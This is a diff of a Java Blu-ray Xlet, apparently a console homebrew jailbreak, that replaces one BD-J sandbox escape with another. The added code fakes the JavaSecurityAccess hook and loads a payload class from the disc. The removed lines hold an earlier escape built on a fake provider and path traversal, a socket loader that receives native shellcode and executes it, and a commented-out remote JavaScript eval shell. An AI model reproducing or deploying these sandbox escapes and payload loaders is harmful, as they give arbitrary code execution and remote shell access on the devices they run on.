@@ -22,10 +22,20 @@ import org.havi.ui.*;
 
 public class MyXlet implements Xlet, ControllerListener {
 
-    private HScene scene;
-    private Container gui;
-    private XletContext context;
-    private final ArrayList messages = new ArrayList();
+	private HScene scene;
+	private Container gui;
+	private XletContext context;
+	private final ArrayList messages = new ArrayList();
+
+    public void escapeSandbox() throws Exception
+    {
+        jdk.internal.access.JavaSecurityAccess real = jdk.internal.access.SharedSecrets.getJavaSecurityAccess();
+        JavaSecurityProxy fake = new JavaSecurityProxy(real);
+        jdk.internal.access.SharedSecrets.setJavaSecurityAccess(fake);
+        java.net.URLClassLoader ldr = java.net.URLClassLoader.newInstance(new java.net.URL[]{new java.net.URL("file:///VP/BDMV/JAR/00000.jar")});
+        ldr.loadClass("org.homebrew.Payload").newInstance();
+        jdk.internal.access.SharedSecrets.setJavaSecurityAccess(real);
+    }
 
     /*public void runJSServer(int port)
     {
@@ -33,87 +43,48 @@ public class MyXlet implements Xlet, ControllerListener {
         ctx.setOptimizationLevel(-1);
         Scriptable scope = ctx.initStandardObjects();
         ctx.evaluateString(scope, "function doEval(s) { try { try { return '' + (_ = eval(s)); } catch(e0) { if(e0.javaException) { var sw = new java.io.StringWriter(); e0.javaException.printStackTrace(new java.io.PrintWriter(sw)); return ''+sw; } return '' + e0 + '\\n' + e0.stack; } } catch(e) { return '' + e + '\\n' + e.stack; } } (function() { var sock = (new java.net.ServerSocket("+port+")).accept(); var fin = sock.getInputStream(); var fout = sock.getOutputStream(); while(true) { fout.write(62); fout.write(32); var s = ''; var i; while((i = fin.read()) != 10) s += String.fromCharCode(i); var ans = doEval(s); for(var i = 0; i < ans.length; i++) fout.write(ans.charCodeAt(i)); fout.write(10); } })()", "<string>", 1, null);
+    }
+
+    public static void main(String[] argv)
+    {
+        (new MyXlet()).runJSServer(4321);
     }*/
 
-    public void escapeSandbox() throws Exception
-    {
-        FakeProvider fp = new FakeProvider("", 0, "");
-        Interfaces.CService cs = new Interfaces.CService(fp);
-        fp.setService(cs);
-        cs.setType("fakeType");
-        cs.setAlgorithm("fakeAlgorithm");
-        cs.setClassName("java.net.URLClassLoader");
-        fp.installFakeAccessor();
-        FakeIxcProxy ixc = new FakeIxcProxy(cs);
-        ClassLoader ldr = (ClassLoader)ixc.pInvokeMethod(new Object[]{new java.net.URL[]{new java.net.URL("file:///app0/bdjstack/lib/ext/../../../../disc/BDMV/JAR/00000.jar")}}, "newInstance", "(Ljava/lang/Object;)Ljava/lang/Object;");
-        ldr.loadClass("org.homebrew.Payload").newInstance(); //System.setSecurityManager(null)
-        fp.installRealAccessor();
-    }
-
-    public long loadPayload(int port) throws Exception
-    {
-        java.net.ServerSocket sock = new java.net.ServerSocket(port);
-        byte[] payload = NativeUtils.readResource(sock.accept().getInputStream());
-        long addr;
-        if(payload[0] == (byte)0xeb && payload[1] == 11 && payload[2] == (byte)'P' && payload[3] == (byte)'L' && payload[4] == (byte)'D')
-        {
-            int q = 0;
-            for(int i = 12; i >= 5; i--)
-            {
-                int j = payload[i];
-                if(j < 0)
-                    j += 256;
-                q = 256 * q + j;
-            }
-            byte[] a = new byte[q];
-            for(int i = 0; i < q; i++)
-                a[i] = payload[i];
-            byte[] b = new byte[payload.length-q];
-            for(int i = 0; i < b.length; i++)
-                b[i] = payload[q+i];
-            return NativeStuff.writePayload2(a, b);
-        }
-        else
-            return NativeStuff.writePayload(payload);
-    }
-    
-    public void runPayload(int port) throws Exception
-    {
-        NativeStuff.callFunction(loadPayload(9019), NativeUtils.dlsym(0x2001, "sceKernelDlsym"), 0, 0, 0, 0, 0);
-    }
-
-    public void initXlet(XletContext context) {
-        this.context = context;
-        
+	public void initXlet(XletContext context) {
+		this.context = context;
+		
 // START: Code required for text output.
 
-        scene = HSceneFactory.getInstance().getDefaultHScene();
+		scene = HSceneFactory.getInstance().getDefaultHScene();
 
-        try {
-            gui = new Screen(messages);
+		try {
 
-            gui.setSize(1920, 1080); // BD screen size
-            scene.add(gui, BorderLayout.CENTER);
+			gui = new Screen(messages);
+
+			gui.setSize(1920, 1080); // BD screen size
+			scene.add(gui, BorderLayout.CENTER);
 
 // END: Code required for text output.
 
-            messages.add("Hello World!");
             try
             {
                 escapeSandbox();
-                runPayload(9019);
                 //runJSServer(4321);
+                messages.add("Directory listing of /app0:");
+                String[] ls = (new java.io.File("/app0")).list();
+                for(int i = 0; i < ls.length; i++)
+                    messages.add(ls[i]);
             }
             catch(Throwable e)
             {
                 printStackTrace(e);
             }
 
-        } catch (Throwable e) {
-            messages.add(e.getMessage());
-        }
-        scene.validate();
-    }
+		} catch (Exception e) {
+			messages.add(e.getMessage());
+		}
+		scene.validate();
+	}
 
     private void printStackTrace(Throwable e)
     {
@@ -139,71 +110,71 @@ public class MyXlet implements Xlet, ControllerListener {
 
 // Don't touch any of the code from here on.
 
-    public void startXlet() {
-        gui.setVisible(true);
-        scene.setVisible(true);
-        gui.requestFocus();
-    }
+	public void startXlet() {
+		gui.setVisible(true);
+		scene.setVisible(true);
+		gui.requestFocus();
+	}
 
-    public void pauseXlet() {
-        gui.setVisible(false);
-    }
+	public void pauseXlet() {
+		gui.setVisible(false);
+	}
 
-    public void destroyXlet(boolean unconditional) {
-        scene.remove(gui);
-        scene = null;
-    }
+	public void destroyXlet(boolean unconditional) {
+		scene.remove(gui);
+		scene = null;
+	}
 
-    /**
-     * Subclasses should override this if they're interested in getting
-     * this event.
-     **/
-    protected void numberKeyPressed(int value){}
+	/**
+	 * Subclasses should override this if they're interested in getting
+	 * this event.
+	 **/
+	protected void numberKeyPressed(int value){}
 
-    /**
-     * Subclasses should override this if they're interested in getting
-     * this event.
-     **/
-    protected void colorKeyPressed(int value){}
+	/**
+	 * Subclasses should override this if they're interested in getting
+	 * this event.
+	 **/
+	protected void colorKeyPressed(int value){}
 
-    /**
-     * Subclasses should override this if they're interested in getting
-     * this event.
-     **/
-    protected void popupKeyPressed(){}
+	/**
+	 * Subclasses should override this if they're interested in getting
+	 * this event.
+	 **/
+	protected void popupKeyPressed(){}
 
-    /**
-     * Subclasses should override this if they're interested in getting
-     * this event.
-     **/
-    protected void enterKeyPressed(){}
+	/**
+	 * Subclasses should override this if they're interested in getting
+	 * this event.
+	 **/
+	protected void enterKeyPressed(){}
 
-    /**
-     * Subclasses should override this if they're interested in getting
-     * this event.
-     **/
-    protected void arrowLeftKeyPressed(){}
+	/**
+	 * Subclasses should override this if they're interested in getting
+	 * this event.
+	 **/
+	protected void arrowLeftKeyPressed(){}
 
-    /**
-     * Subclasses should override this if they're interested in getting
-     * this event.
-     **/
-    protected void arrowRightPressed(){}
+	/**
+	 * Subclasses should override this if they're interested in getting
+	 * this event.
+	 **/
+	protected void arrowRightPressed(){}
 
-    /**
-     * Subclasses should override this if they're interested in getting
-     * this event.
-     **/
-    protected void arrowUpPressed(){}
+	/**
+	 * Subclasses should override this if they're interested in getting
+	 * this event.
+	 **/
+	protected void arrowUpPressed(){}
 
-    /**
-     * Subclasses should override this if they're interested in getting
-     * this event.
-     **/
-    protected void arrowDownPressed(){}
+	/**
+	 * Subclasses should override this if they're interested in getting
+	 * this event.
+	 **/
+	protected void arrowDownPressed(){}
 
-    public void controllerUpdate(ControllerEvent arg0) {
-        // TODO Auto-generated method stub
-        
-    }
+	public void controllerUpdate(ControllerEvent arg0) {
+		// TODO Auto-generated method stub
+		
+	}
 }
